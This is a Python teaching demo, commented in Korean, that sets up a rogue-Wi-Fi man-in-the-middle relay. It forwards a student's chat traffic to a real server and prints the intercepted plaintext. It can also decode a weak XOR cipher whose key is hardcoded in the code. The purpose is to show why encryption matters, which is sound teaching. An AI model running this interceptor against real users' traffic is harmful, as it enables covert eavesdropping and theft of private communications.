"""
[시연용] wifi_mitm_demo/sniffer.py  :  몰래 끼어 엿보는 중간자 (악성 와이파이)
============================================================
"우리도 모르게 누가 중간에 끼어서 다 본다" — 그걸 보여 주는 프로그램.

상황(기계 2대):
  학생(피해자) ──▶ 핫스팟 [이 sniffer.py :5000] ──▶ 다른 컴퓨터 [server.py :5000]
  - 학생은 '무료 와이파이'에 평소처럼 접속하고 채팅할 뿐, 아무 설정도 안 바꿉니다.
  - 그 트래픽이 전부 이 sniffer 를 '지나가고', sniffer 는 진짜 서버로 그대로
    흘려보내며(중계) 동시에 몰래 엿봅니다(탈취). 학생은 sniffer 가 있는 줄 모릅니다.
  - 진짜 서버는 저 멀리 다른 컴퓨터에 있습니다 → "멀리 있어도 중간에서 털린다".

핵심 대비:
  · 평문(PlainCodec)   → 내용이 그대로 읽힌다.      "탈취 성공" 😱
  · 암호화(SecretCodec) → 알아볼 수 없는 글자만.       "탈취 실패" 🔒

순수 파이썬입니다. tshark·관리자 권한·패킷 헤더 파싱 필요 없음.

⚠️ 반드시 '내가 만든 이 와이파이 + 실습 참가자'에게만. 남의 통신 도청은 불법입니다.
"""

import socket
import threading

# 학생(피해자)을 받는 곳: 핫스팟의 모든 주소에서 수신
LISTEN_HOST, LISTEN_PORT = "0.0.0.0", 5000
# 진짜 채팅 서비스(★ 다른 컴퓨터의 IP 로 바꾸세요. 같은 핫스팟에 붙은 그 컴퓨터)
SERVER_HOST, SERVER_PORT = "192.168.137.50", 5000

# (심화) True 로 켜면, 코드에 '박힌' 열쇠로 XOR 암호를 풀어 본다.
#   → "열쇠가 코드에 있으면 암호도 뚫린다 = 진짜 보안이 아니다"
SHOW_CRACK = False
XOR_KEY = 42

_BASE64_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")


def looks_readable(text):
    """base64 밖 글자(한글·'|'·공백 등)가 있으면 '읽을 수 있는 평문'으로 본다."""
    return any(ch not in _BASE64_CHARS for ch in text)


def try_crack(text):
    import base64
    try:
        raw = base64.b64decode(text)
        plain = bytes(b ^ XOR_KEY for b in raw).decode("utf-8")
        return plain if "|" in plain else None
    except Exception:
        return None


def steal(direction, text):
    if not text:
        return
    arrow = "학생 → 서비스" if direction == "up" else "서비스 → 학생"
    if looks_readable(text):
        print(f"  😱 [탈취 성공] {arrow}  |  {text}")
    else:
        print(f"  🔒 [탈취 실패] {arrow}  |  {text}   ← 알아볼 수 없음")
        if SHOW_CRACK:
            cracked = try_crack(text)
            if cracked:
                print(f"      └ (박힌 열쇠 {XOR_KEY} 로 복호화) {cracked}   ← 그래서 진짜 보안이 아니다!")


def pump(src, dst, direction):
    """src 에서 온 줄을 dst 로 그대로 흘려보내며(중계), 동시에 엿본다(탈취)."""
    reader = src.makefile("rb")
    try:
        for raw in reader:
            dst.sendall(raw)                     # ① 그대로 중계 → 채팅은 멀쩡
            text = raw.decode("utf-8", "replace").rstrip("\n")
            steal(direction, text)               # ② 몰래 엿보기 → 탈취
    except OSError:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def handle(client_conn, addr):
    try:
        server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_conn.connect((SERVER_HOST, SERVER_PORT)) 
    except OSError:
        print(f"[중간자] 진짜 서버({SERVER_HOST}:{SERVER_PORT})에 연결 실패 — "
              f"그 컴퓨터의 server.py 실행/방화벽/IP 를 확인하세요.")
        client_conn.close()
        return
    threading.Thread(target=pump, args=(client_conn, server_conn, "up"), daemon=True).start()
    pump(server_conn, client_conn, "down")
    client_conn.close()
    server_conn.close()


def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LISTEN_HOST, LISTEN_PORT))
    listener.listen()
    print(f"[중간자] {LISTEN_HOST}:{LISTEN_PORT} 에서 학생을 받아 → 서비스 {SERVER_HOST}:{SERVER_PORT} 로 중계")
    print("[중간자] 지나가는 모든 줄을 몰래 엿봅니다. (Ctrl+C 종료)\n")
    try:
        while True:
            client_conn, addr = listener.accept()
            print(f"[중간자] 새 학생 접속: {addr}")
            threading.Thread(target=handle, args=(client_conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[중간자] 종료합니다.")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
